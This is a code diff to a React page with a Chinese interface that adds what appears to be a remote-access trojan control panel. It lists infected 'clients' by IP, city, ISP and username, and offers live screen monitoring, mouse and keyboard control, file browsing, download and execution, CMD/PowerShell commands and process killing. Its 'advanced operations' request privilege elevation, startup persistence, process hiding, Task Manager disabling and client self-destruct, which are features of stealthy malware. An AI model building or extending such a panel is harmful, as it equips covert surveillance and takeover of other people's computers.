@@ -790,6 +790,201 @@ export default function Home() {
     </div>
   )
 
+  const [clients, setClients] = useState<any[]>([])
+  const [selectedClient, setSelectedClient] = useState<any>(null)
+  const [screenshotUrl, setScreenshotUrl] = useState('')
+  const [screenViewActive, setScreenViewActive] = useState(false)
+  const [directoryItems, setDirectoryItems] = useState<any[]>([])
+  const [currentPath, setCurrentPath] = useState('.')
+  const [processes, setProcesses] = useState<any[]>([])
+  const [keylogContent, setKeylogContent] = useState('')
+  const [remoteCommand, setRemoteCommand] = useState('')
+  const [commandResult, setCommandResult] = useState('')
+  const [commandType, setCommandType] = useState('cmd')
+  const [downloadProgress, setDownloadProgress] = useState('')
+  const [uploadFileName, setUploadFileName] = useState('')
+
+  const fetchClients = async () => {
+    try {
+      const response = await fetch('/api/admin/clients?action=list')
+      const result = await response.json()
+      if (result.status === 'success') {
+        setClients(result.clients)
+      }
+    } catch (error) {
+      console.error('获取客户端列表失败:', error)
+    }
+  }
+
+  const fetchScreenshot = async (clientId: string) => {
+    try {
+      const response = await fetch(`/api/admin/clients?action=screenshot&id=${clientId}`)
+      const result = await response.json()
+      if (result.status === 'success' && result.url) {
+        setScreenshotUrl(result.url + '?' + Date.now())
+      }
+    } catch (error) {
+      console.error('获取截图失败:', error)
+    }
+  }
+
+  const sendRemoteCommand = async (clientId: string, command: string, type: string) => {
+    try {
+      const response = await fetch(`/api/admin/remote?action=sendCommand&clientId=${clientId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ command, type })
+      })
+      const result = await response.json()
+      
+      if (result.status === 'success') {
+        setTimeout(() => getCommandResult(clientId, result.commandId), 2000)
+        showMessage('命令已发送', 'success')
+      }
+    } catch (error) {
+      showMessage('命令发送失败', 'error')
+    }
+  }
+
+  const getCommandResult = async (clientId: string, commandId: string) => {
+    try {
+      const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}&commandId=${commandId}`)
+      const result = await response.json()
+      if (result.status === 'success' && result.result) {
+        setCommandResult(result.result.output || result.result.message || '')
+      }
+    } catch (error) {
+      console.error('获取命令结果失败:', error)
+    }
+  }
+
+  const getClientDirectory = async (clientId: string, path: string = '.') => {
+    try {
+      await sendRemoteCommand(clientId, path, 'directory')
+      setTimeout(async () => {
+        const response = await fetch(`/api/admin/clients?action=info&id=${clientId}`)
+        const result = await response.json()
+        if (result.status === 'success') {
+          const cmdResponse = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
+          const cmdResult = await cmdResponse.json()
+          if (cmdResult.result) {
+            try {
+              const data = JSON.parse(cmdResult.result.output)
+              if (data.items) {
+                setDirectoryItems(data.items)
+                setCurrentPath(path)
+              }
+            } catch {
+              setDirectoryItems([])
+            }
+          }
+        }
+      }, 1500)
+    } catch (error) {
+      console.error('获取目录失败:', error)
+    }
+  }
+
+  const getClientProcesses = async (clientId: string) => {
+    try {
+      await sendRemoteCommand(clientId, '', 'processes')
+      setTimeout(async () => {
+        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
+        const result = await response.json()
+        if (result.status === 'success' && result.result) {
+          try {
+            const data = JSON.parse(result.result.output)
+            if (data.processes) {
+              setProcesses(data.processes)
+            }
+          } catch {
+            setProcesses([])
+          }
+        }
+      }, 2000)
+    } catch (error) {
+      console.error('获取进程失败:', error)
+    }
+  }
+
+  const killClientProcess = async (clientId: string, pid: number) => {
+    await sendRemoteCommand(clientId, pid.toString(), 'kill')
+    setTimeout(() => getClientProcesses(clientId), 1000)
+  }
+
+  const startScreenView = async (clientId: string) => {
+    setScreenViewActive(true)
+    const fetchScreen = async () => {
+      if (!screenViewActive) return
+      await fetchScreenshot(clientId)
+      setTimeout(fetchScreen, 3000)
+    }
+    fetchScreen()
+  }
+
+  const stopScreenView = () => {
+    setScreenViewActive(false)
+  }
+
+  const handleMouseControl = (clientId: string, x: number, y: number, action: string) => {
+    sendRemoteCommand(clientId, `${x}|${y}|${action}`, 'mouse')
+  }
+
+  const handleKeyboardControl = (clientId: string, key: string, action: string) => {
+    sendRemoteCommand(clientId, `${key}|${action}`, 'keyboard')
+  }
+
+  const handleRemoteCmd = () => {
+    if (selectedClient && remoteCommand) {
+      sendRemoteCommand(selectedClient.id, remoteCommand, commandType)
+      setTimeout(async () => {
+        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${selectedClient.id}`)
+        const result = await response.json()
+        if (result.status === 'success' && result.result) {
+          setCommandResult(result.result.output || result.result.message || '')
+        }
+      }, 3000)
+    }
+  }
+
+  const handleDownloadFile = (clientId: string, filePath: string) => {
+    sendRemoteCommand(clientId, filePath, 'download')
+    setDownloadProgress(`正在下载: ${filePath}`)
+    setTimeout(() => setDownloadProgress(''), 3000)
+  }
+
+  const handleExecuteFile = (clientId: string, filePath: string) => {
+    sendRemoteCommand(clientId, filePath, 'execute')
+    showMessage('文件已执行', 'success')
+  }
+
+  const handleElevate = (clientId: string) => {
+    sendRemoteCommand(clientId, '', 'elevate')
+    showMessage('已请求提权', 'success')
+  }
+
+  const handleAddStartup = (clientId: string) => {
+    sendRemoteCommand(clientId, '', 'startup')
+    showMessage('已添加到开机启动', 'success')
+  }
+
+  const handleHideProcess = (clientId: string) => {
+    sendRemoteCommand(clientId, '', 'hide')
+    showMessage('进程已隐藏', 'success')
+  }
+
+  const handleBlockTaskMgr = (clientId: string) => {
+    sendRemoteCommand(clientId, '', 'block_taskmgr')
+    showMessage('任务管理器已禁用', 'success')
+  }
+
+  const handleSelfDestruct = (clientId: string) => {
+    if (!confirm('确定要让客户端自毁吗？此操作不可恢复！')) return
+    sendRemoteCommand(clientId, '', 'selfdestruct')
+    showMessage('客户端已自毁', 'success')
+    setTimeout(() => fetchClients(), 1000)
+  }
+
   const renderRemoteServerTab = () => (
     <div className="remote-server-content">
       {!remoteServerAuthenticated ? (
@@ -826,73 +1021,330 @@ export default function Home() {
         </div>
       ) : (
         <div className="remote-server-dashboard">
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem', flexWrap: 'wrap', gap: '1rem' }}>
             <h2>
               <i className="fas fa-server"></i> 远程服务端
             </h2>
-            <button 
-              className="btn" 
-              onClick={handleRemoteServerLogout}
-              style={{ background: '#e74c3c' }}
-            >
-              <i className="fas fa-lock"></i> 退出
-            </button>
-          </div>
-          
-          <div className="card">
-            <h3>功能开发中</h3>
-            <p>远程服务端功能正在开发中，将在后续版本中推出。</p>
-            <div className="coming-soon">
-              <i className="fas fa-clock"></i>
-              <span>敬请期待</span>
+            <div style={{ display: 'flex', gap: '1rem' }}>
+              <button 
+                className="btn" 
+                onClick={fetchClients}
+                style={{ background: '#3498db' }}
+              >
+                <i className="fas fa-refresh"></i> 刷新客户端
+              </button>
+              <button 
+                className="btn" 
+                onClick={handleRemoteServerLogout}
+                style={{ background: '#e74c3c' }}
+              >
+                <i className="fas fa-lock"></i> 退出
+              </button>
             </div>
           </div>
 
-          {isAdmin && (
-            <div className="card admin-remote-section">
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '2rem' }}>
+            <div className="card client-list-card">
               <h3>
-                <i className="fas fa-terminal"></i> 管理员命令执行
+                <i className="fas fa-users"></i> 在线客户端 ({clients.filter(c => c.status === 'online').length}/{clients.length})
               </h3>
-              {currentDir && (
-                <div style={{ 
-                  background: '#f8f9fa', 
-                  padding: '0.5rem 1rem', 
-                  borderRadius: '6px', 
-                  marginBottom: '1rem',
-                  fontFamily: 'monospace',
-                  color: '#333'
-                }}>
-                  <span style={{ color: '#666' }}>当前目录:</span> {currentDir}
-                </div>
-              )}
-              <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
-                <input
-                  type="text"
-                  value={command}
-                  onChange={(e) => setCommand(e.target.value)}
-                  placeholder="输入命令，如: dir, ipconfig"
-                  style={{ flex: 1, padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
-                  onKeyPress={(e) => e.key === 'Enter' && handleExecuteCommand()}
-                />
-                <button className="btn" onClick={handleExecuteCommand} style={{ background: '#9b59b6' }}>
-                  <i className="fas fa-play"></i> 执行
-                </button>
+              <div className="client-list">
+                {clients.map((client) => (
+                  <div 
+                    key={client.id}
+                    className={`client-item ${client.status === 'online' ? 'online' : 'offline'} ${selectedClient?.id === client.id ? 'selected' : ''}`}
+                    onClick={() => {
+                      setSelectedClient(client)
+                      setScreenshotUrl('')
+                      setScreenViewActive(false)
+                      setDirectoryItems([])
+                      setProcesses([])
+                      setCommandResult('')
+                    }}
+                  >
+                    <div className="client-status">
+                      <span className={`status-dot ${client.status === 'online' ? 'online' : 'offline'}`}></span>
+                      <span className="client-hostname">{client.hostname}</span>
+                    </div>
+                    <div className="client-info">
+                      <span className="client-ip">{client.ip}</span>
+                      <span className="client-location">{client.city}, {client.country}</span>
+                    </div>
+                    <div className="client-meta">
+                      <span>{client.os}</span>
+                      <span>{client.username}</span>
+                    </div>
+                  </div>
+                ))}
+                {clients.length === 0 && (
+                  <p style={{ textAlign: 'center', color: '#666', padding: '2rem' }}>暂无在线客户端</p>
+                )}
               </div>
-              {cmdResult && (
-                <div style={{ 
-                  background: '#1a1a2e', 
-                  color: '#00ff00', 
-                  padding: '1rem', 
-                  borderRadius: '6px', 
-                  fontFamily: 'monospace',
-                  maxHeight: '300px',
-                  overflowY: 'auto'
-                }}>
-                  <pre>{cmdResult}</pre>
+            </div>
+
+            <div className="client-panel">
+              {selectedClient ? (
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
+                  <div className="card client-info-card">
+                    <h3>
+                      <i className="fas fa-info-circle"></i> 客户端信息
+                    </h3>
+                    <div className="info-grid">
+                      <div className="info-item"><span className="label">ID:</span> {selectedClient.id}</div>
+                      <div className="info-item"><span className="label">IP:</span> {selectedClient.ip}</div>
+                      <div className="info-item"><span className="label">国家:</span> {selectedClient.country}</div>
+                      <div className="info-item"><span className="label">城市:</span> {selectedClient.city}</div>
+                      <div className="info-item"><span className="label">ISP:</span> {selectedClient.isp}</div>
+                      <div className="info-item"><span className="label">主机名:</span> {selectedClient.hostname}</div>
+                      <div className="info-item"><span className="label">操作系统:</span> {selectedClient.os}</div>
+                      <div className="info-item"><span className="label">用户名:</span> {selectedClient.username}</div>
+                      <div className="info-item"><span className="label">CPU:</span> {selectedClient.cpu}</div>
+                      <div className="info-item"><span className="label">内存:</span> {selectedClient.ram}</div>
+                    </div>
+                  </div>
+
+                  <div className="card screen-view-card">
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                      <h3>
+                        <i className="fas fa-desktop"></i> 屏幕查看
+                      </h3>
+                      <div style={{ display: 'flex', gap: '0.5rem' }}>
+                        {!screenViewActive ? (
+                          <button 
+                            className="btn" 
+                            onClick={() => startScreenView(selectedClient.id)}
+                            style={{ background: '#2ecc71' }}
+                          >
+                            <i className="fas fa-play"></i> 开始监控
+                          </button>
+                        ) : (
+                          <button 
+                            className="btn" 
+                            onClick={stopScreenView}
+                            style={{ background: '#e74c3c' }}
+                          >
+                            <i className="fas fa-stop"></i> 停止监控
+                          </button>
+                        )}
+                      </div>
+                    </div>
+                    <div className="screen-container">
+                      {screenshotUrl ? (
+                        <img 
+                          src={screenshotUrl} 
+                          alt="客户端屏幕" 
+                          className="screen-image"
+                          onClick={(e) => {
+                            const rect = e.currentTarget.getBoundingClientRect()
+                            const x = ((e.clientX - rect.left) / rect.width) * 1920
+                            const y = ((e.clientY - rect.top) / rect.height) * 1080
+                            handleMouseControl(selectedClient.id, Math.round(x), Math.round(y), 'click')
+                          }}
+                        />
+                      ) : (
+                        <div className="screen-placeholder">
+                          <i className="fas fa-desktop"></i>
+                          <span>点击开始监控查看客户端屏幕</span>
+                        </div>
+                      )}
+                    </div>
+                    <div className="mouse-controls">
+                      <button 
+                        className="btn" 
+                        onClick={() => handleMouseControl(selectedClient.id, 0, 0, 'move')}
+                        style={{ background: '#95a5a6' }}
+                      >
+                        <i className="fas fa-mouse-pointer"></i> 移动鼠标到左上角
+                      </button>
+                      <button 
+                        className="btn" 
+                        onClick={() => handleKeyboardControl(selectedClient.id, 'enter', 'press')}
+                        style={{ background: '#95a5a6' }}
+                      >
+                        <i className="fas fa-keyboard"></i> 按回车键
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="card directory-card">
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                      <h3>
+                        <i className="fas fa-folder-open"></i> 文件浏览
+                      </h3>
+                      <button 
+                        className="btn" 
+                        onClick={() => getClientDirectory(selectedClient.id)}
+                        style={{ background: '#3498db' }}
+                      >
+                        <i className="fas fa-refresh"></i> 刷新
+                      </button>
+                    </div>
+                    <div className="path-bar">
+                      当前路径: {currentPath}
+                    </div>
+                    <div className="file-browser">
+                      {directoryItems.map((item, index) => (
+                        <div key={`${item.name}-${index}`} className="browser-item">
+                          <i className={`fas ${item.type === 'directory' ? 'fa-folder text-orange' : 'fa-file text-blue'}`}></i>
+                          <span className="item-name">{item.name}</span>
+                          {item.size && <span className="item-size">{(item.size / 1024).toFixed(2)} KB</span>}
+                          <div className="item-actions">
+                            {item.type === 'directory' && (
+                              <button 
+                                className="btn btn-sm" 
+                                onClick={() => getClientDirectory(selectedClient.id, item.path)}
+                              >
+                                <i className="fas fa-folder-open"></i> 进入
+                              </button>
+                            )}
+                            {item.type === 'file' && (
+                              <>
+                                <button 
+                                  className="btn btn-sm" 
+                                  onClick={() => handleExecuteFile(selectedClient.id, item.path)}
+                                >
+                                  <i className="fas fa-play"></i> 执行
+                                </button>
+                                <button 
+                                  className="btn btn-sm" 
+                                  onClick={() => handleDownloadFile(selectedClient.id, item.path)}
+                                >
+                                  <i className="fas fa-download"></i> 下载
+                                </button>
+                              </>
+                            )}
+                          </div>
+                        </div>
+                      ))}
+                      {directoryItems.length === 0 && (
+                        <p style={{ textAlign: 'center', color: '#666', padding: '1rem' }}>点击刷新查看目录</p>
+                      )}
+                    </div>
+                  </div>
+
+                  <div className="card processes-card">
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                      <h3>
+                        <i className="fas fa-cog"></i> 进程管理
+                      </h3>
+                      <button 
+                        className="btn" 
+                        onClick={() => getClientProcesses(selectedClient.id)}
+                        style={{ background: '#3498db' }}
+                      >
+                        <i className="fas fa-refresh"></i> 刷新进程
+                      </button>
+                    </div>
+                    <div className="process-list">
+                      {processes.map((proc) => (
+                        <div key={proc.pid} className="process-item">
+                          <div className="process-info">
+                            <span className="process-name">{proc.name}</span>
+                            <span className="process-pid">PID: {proc.pid}</span>
+                            <span className="process-user">{proc.username}</span>
+                          </div>
+                          <button 
+                            className="btn btn-sm danger" 
+                            onClick={() => killClientProcess(selectedClient.id, proc.pid)}
+                          >
+                            <i className="fas fa-times"></i> 结束
+                          </button>
+                        </div>
+                      ))}
+                      {processes.length === 0 && (
+                        <p style={{ textAlign: 'center', color: '#666', padding: '1rem' }}>点击刷新查看进程</p>
+                      )}
+                    </div>
+                  </div>
+
+                  <div className="card command-card">
+                    <h3>
+                      <i className="fas fa-terminal"></i> 命令执行
+                    </h3>
+                    <div className="command-input-group">
+                      <select 
+                        value={commandType}
+                        onChange={(e) => setCommandType(e.target.value)}
+                        className="command-select"
+                      >
+                        <option value="cmd">CMD</option>
+                        <option value="powershell">PowerShell</option>
+                      </select>
+                      <input
+                        type="text"
+                        value={remoteCommand}
+                        onChange={(e) => setRemoteCommand(e.target.value)}
+                        placeholder="输入命令..."
+                        className="command-input"
+                        onKeyPress={(e) => e.key === 'Enter' && handleRemoteCmd()}
+                      />
+                      <button 
+                        className="btn" 
+                        onClick={handleRemoteCmd}
+                        style={{ background: '#9b59b6' }}
+                      >
+                        <i className="fas fa-play"></i> 执行
+                      </button>
+                    </div>
+                    {commandResult && (
+                      <div className="command-output">
+                        <pre>{commandResult}</pre>
+                      </div>
+                    )}
+                  </div>
+
+                  <div className="card actions-card">
+                    <h3>
+                      <i className="fas fa-tools"></i> 高级操作
+                    </h3>
+                    <div className="action-buttons">
+                      <button 
+                        className="btn action-btn" 
+                        onClick={() => handleElevate(selectedClient.id)}
+                        style={{ background: '#f39c12' }}
+                      >
+                        <i className="fas fa-shield-alt"></i> 提权至管理员
+                      </button>
+                      <button 
+                        className="btn action-btn" 
+                        onClick={() => handleAddStartup(selectedClient.id)}
+                        style={{ background: '#2ecc71' }}
+                      >
+                        <i className="fas fa-power-off"></i> 添加到开机启动
+                      </button>
+                      <button 
+                        className="btn action-btn" 
+                        onClick={() => handleHideProcess(selectedClient.id)}
+                        style={{ background: '#9b59b6' }}
+                      >
+                        <i className="fas fa-eye-slash"></i> 隐藏进程
+                      </button>
+                      <button 
+                        className="btn action-btn" 
+                        onClick={() => handleBlockTaskMgr(selectedClient.id)}
+                        style={{ background: '#e74c3c' }}
+                      >
+                        <i className="fas fa-ban"></i> 禁止任务管理器
+                      </button>
+                      <button 
+                        className="btn action-btn danger" 
+                        onClick={() => handleSelfDestruct(selectedClient.id)}
+                        style={{ background: '#c0392b' }}
+                      >
+                        <i className="fas fa-bomb"></i> 自毁客户端
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="card empty-state">
+                  <i className="fas fa-computer"></i>
+                  <h3>选择一个客户端</h3>
+                  <p>从左侧列表中选择一个在线客户端以查看和控制</p>
                 </div>
               )}
             </div>
-          )}
+          </div>
         </div>
       )}
     </div>
